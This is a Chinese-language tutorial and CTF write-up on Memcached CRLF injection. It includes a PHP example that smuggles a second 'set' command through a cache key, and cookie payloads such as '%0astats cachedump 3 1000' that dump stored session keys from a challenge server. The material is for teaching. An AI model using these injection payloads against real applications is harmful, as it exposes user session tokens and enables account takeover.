# 被人遗忘的Memcached内存注射

0x00 写在前面
=========

* * *

wooyun主站也有过Memcached相关漏洞，但大多都是未授权访问，其实即使是部署得当的Memcached，如果碰上安全意识差的程序员哥哥，那么同样会出现Memcached安全风险，导致敏感内存泄露。

也就是本文要说的Memcached注入

0x01 Memcached简介&安全性分析
======================

* * *

Memcached 是一个高性能的分布式内存对象缓存系统，用于动态Web应用以减轻数据库负载。

它通过在内存中缓存数据和对象来减少读取数据库的次数，从而提高动态、数据库驱动网站的速度。

用白话就是说，当传统web将访问产生的临时数据存储在后端数据库（如user sessions），部署了Memcached的应用会将user sessions以及其他一些敏感信息存储在RAM中，增速同时也减轻后端数据库反复查询带来的负载。

Memcached创建者Dormando很早就写过两篇文章，告诫开发人员不要用memcached存储Session。但是很多开发者为了性能或者其他原因，依旧把session存储在memcached中。这样做，一旦memcached被攻击，直接将导致管理员或者是用户token泄露。

0x02 Memcached协议
================

* * *

当Memcache被部署之后，我们该如何向其中添加数据？我们通过一个cheat sheet了解一下Memcached的协议。

Memcached的语法由如下元素组成

{COMMAND}0x20{ARGUMENT}(LF|CRLF)

command字段有如下几条命令

1.  存储操作(set, add, replace, append, prepend, cas)
2.  检索操作 (get, gets)
3.  删除操作 (delete)
4.  增减操作 (incr, decr)
5.  touch
6.  slabs reassign
7.  slabs automove
8.  lru_crawler
9.  统计操作(stats items, slabs, cachedump)
10.  其他操作 (version, flush_all, quit)

下面给出几个安全测试中有用的命令

<table border="1" style="box-sizing: border-box; border-collapse: separate; border-spacing: 0px; background-color: rgb(255, 255, 255); border-top: 1px solid rgb(224, 224, 224); border-left: 1px solid rgb(224, 224, 224); font-family: Helvetica, Arial, &quot;Hiragino Sans GB&quot;, sans-serif; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">Command</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">描述</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">实例</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">get</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">读某个值</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">get mykey</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">set</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">强制设置某个键值</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">set mykey 0 60 5</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">add</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">添加新键值对</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">add newkey 0 60 5</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">replace</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">覆盖已经存在的key</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">replace key 0 60 5</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">flush_all</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">让所有条目失效</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">flush_all</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">stats</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">打印当前状态</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">stats</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">stats malloc</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">打印内存状态</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">stats malloc</td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">version</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">打印Memcached版本</td><td style="box-sizing: border-box; padding: 0px 3px; border-bottom: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224);">version</td></tr></tbody></table>

**stats cachedump 读取内存中存储的条目**

0x03 Memcached代码实现
==================

* * *

部署好Memcached之后，一个调用Memcached的php代码是这样的。

```
<?php    

$m = new Memcached();     

$m->set("prefix_".$_GET[‘key’],"data");

```

为了体现漏洞的产生，我想这样写

```
<?php    

$m = new Memcached();    

$m->addServer('localhost', 11211);    

$m->set("key1 0 0 1\r\n1\r\nset injected 0 3600 10\r\n1234567890\r\n","1234567890",30);    

?>

```

`set("key1 0 0 1\r\n1\r\nset injected 0 3600 10\r\n1234567890\r\n","1234567890",30)`

是的，这里也就能看到问题。

执行刚刚的命令的时候，server和client的通信是这样的（>表示发送到Memcached ，<表示从Memcached的返回）

```
> set key 0 0 1
> 1
< STORED

> set injected 0 3600 10
> 1234567890
< STORED

> 0 30 10
< ERROR

> 1234567890
< ERROR

```

可以看到，对Memcached的协议来讲，\r\n是可以用来分割命令的，所以说，我们能直接通过CLRF注入，将\r\n注入到将要传入Memcached的元素中（例如cookies），实现命令执行。

0x04 Memcache Injection实例
=========================

* * *

最近的一次ctf中，有一个典型的基于CLRF的Memcache注入。（目前该站可以访问）

`http://login2.chal.mmactf.link/login`

login as admin

登录之后的请求是这样的

```
GET / HTTP/1.1
Host: login2.chal.mmactf.link
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/   20100101 Firefox/38.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://login2.chal.mmactf.link/login
Cookie: ss=c4a613cdf3378b458be9a6d8de6c52c6ab260d1ee5c2d94df6fe260e580b16bb
Connection: keep-alive

```

在测试http头注入的时候，我们发现将%0a注入到cookies中时,也就是请求：

`Cookie: ss=%0ac4a613cdf3378b458be9a6d8de6c52c6ab260d1ee5c2d94df6fe260e580b16bb`

返回如下

```
</div>
<div id="info">
<p>MemcacheError:ERROR  
ERROR</p>
</div>
</body>
</html>

```

恩，memcached出错了，那不就是刚刚提到的error吗？

```
> 1234567890
< ERROR

```

说明这里ss的value代入了memcached。

我们继续在cookies里面注入:ss=%0astats

```
MemcacheError:ERROR
STAT pid 988
STAT uptime 651664
STAT time 1442726665
STAT version 1.4.14 (Ubuntu)
STAT libevent 2.0.21-stable
STAT pointer_size 64
STAT rusage_user 17.256000
STAT rusage_system 18.232000
STAT curr_connections 5
STAT total_connections 946
STAT connection_structures 6
STAT reserved_fds 20
STAT cmd_get 615
STAT cmd_set 188
STAT cmd_flush 0
STAT cmd_touch 0
STAT get_hits 299
STAT get_misses 316
STAT delete_misses 0
STAT delete_hits 42
STAT incr_misses 0
STAT incr_hits 0
STAT decr_misses 0
STAT decr_hits 0
STAT cas_misses 0
STAT cas_hits 0
STAT cas_badval 0
STAT touch_hits 0
STAT touch_misses 0
STAT auth_cmds 0
STAT auth_errors 0
STAT bytes_read 54350
STAT bytes_written 86307
STAT limit_maxbytes 67108864
STAT accepting_conns 1
STAT listen_disabled_num 0
STAT threads 4
STAT conn_yields 0
STAT hash_power_level 16
STAT hash_bytes 524288
STAT hash_is_expanding 0
STAT expired_unfetched 15
STAT evicted_unfetched 0
STAT bytes 1137
STAT curr_items 8
STAT total_items 153
STAT evictions 0
STAT reclaimed 96
END

```

果然返回了memcached的stats

现在来做我们最想做的一件事情，dump内存中的东西看看：我们利用cachedump

`stats cachedump {slab class} {number of items to dump}`

这里需要介绍下 memcached是以slab class进行分类的 比如：

```
$ memcached -vv
slab class   1: chunk size        96 perslab   10922
slab class   2: chunk size       120 perslab    8738
slab class   3: chunk size       152 perslab    6898
slab class   4: chunk size       192 perslab    5461

```

我们可以看到每个class的编排

所以我们每一个都dump出来看看才好：

`Cookie: %0astats cachedump 1 1000`

返回为

`MemcacheError:ERROR ITEM key [1 b; 1441762228 s] ITEM 12345 [20 b; 1441494967 s] END`

当我遍历到class 3的时候：

```
Cookie: %0astats cachedump 3 1000    
MemcacheError:ERROR 
ITEM 3f063d8659f0f08c4454554294aca59bbe42cc6e11db23eb69f5a1c0a9486aa1 [19 b; 1442016274 s] 
ITEM 0e9d0aecea498b15ee63d38dd4664dcfc75be0846ec4baee931b45a04462eeab [20 b; 1441494967 s] 
ITEM 09cf27be606344f29bda74bd7c035e6d862c95025a2a6bb1785c8883ae65b18a [16 b; 1441494967 s] 
ITEM b33542ed3c8bf5c2c346e26aac28a10055fa6a50c4948873810798e9f4cfca98 [20 b; 1441494967 s] 
ITEM e391306f6481940ab3c796eb1253435b06e9a9357227de734b0ec3f58bd14d7f [19 b; 1442011213 s] 
ITEM c706b288065ad5c29153d8773c3e3be6e8a07408cdf4e0e40e97917896e43839 [19 b; 1442012877 s] 
ITEM a5e754e6e804bf7e49f8096242a6566cc337b06aa6c2dafda3f86edccf8cb4b3 [19 b; 1442011191 s] 
ITEM edf938c33d05ff9f8696415d5ef817014a5cc2906abe24576fdafe8ae58dde48 [19 b; 1442010879 s] 
ITEM 5f7d07e310e9fad574d0975741a9c05d0d75d7157ce9bb9546b7f58d940cee7a [19 b; 1442006048 s] 
ITEM 3d1a32800a501fe7387287ba4631ae9318206ef96083a29f35fd1ef42f7a85c5 [19 b; 1441998916 s] 

```

终于注入到我们所需要的class中去。

0x05 参考
=======

* * *

**Memcache cheat sheet**:[http://lzone.de/cheat-sheet/memcached](http://lzone.de/cheat-sheet/memcached)

**Memcached Injection**:[https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf](https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf)